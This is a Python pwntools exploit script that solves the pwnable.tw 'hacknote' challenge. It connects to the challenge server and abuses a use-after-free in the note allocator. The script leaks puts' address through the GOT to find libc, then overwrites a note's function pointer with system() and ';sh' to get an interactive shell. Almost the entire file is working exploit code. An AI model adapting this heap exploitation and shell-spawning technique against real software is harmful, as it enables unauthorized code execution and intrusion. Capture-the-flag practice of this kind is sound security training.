from pwn import *

context(os="linux", arch="i386", log_level="debug")
ready = True
elf = ELF("./hacknote")
if ready:
    io = remote("chall.pwnable.tw", 10102)
    libc = ELF("./libc.so.6")
    context.log_level = "INFO"
else:
    io = process("./hacknote")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")

def addnote(size, content):
    io.sendlineafter("Your choice :", str(1))
    io.sendlineafter("Note size :", str(size))
    io.sendlineafter("Content :", content)


def delnote(index):
    io.sendlineafter("Your choice :", str(2))
    io.sendlineafter("Index :", str(index))

def printnote(index):
    io.sendlineafter("Your choice :", str(3))
    io.sendlineafter("Index :", str(index))
    try:
        s = io.recvline(timeout=1)
        return s[:4]
    except EOFError:
        pass

addnote(16, "padding")
addnote(16, "padding")
delnote(0)
delnote(1)
addnote(8, p32(0x804862B) + p32(elf.got["puts"]))

puts_addr = u32(printnote(0).ljust(4, "\x00"))
libc_base = puts_addr - libc.sym["puts"]
log.info("libc_base: 0x%x" % libc_base)
system_addr = libc_base + libc.symbols["system"]
delnote(2)

# ref https://blog.csdn.net/freedom2028/article/details/7104131
addnote(8, p32(system_addr) + ";sh\0")
printnote(0)
io.interactive()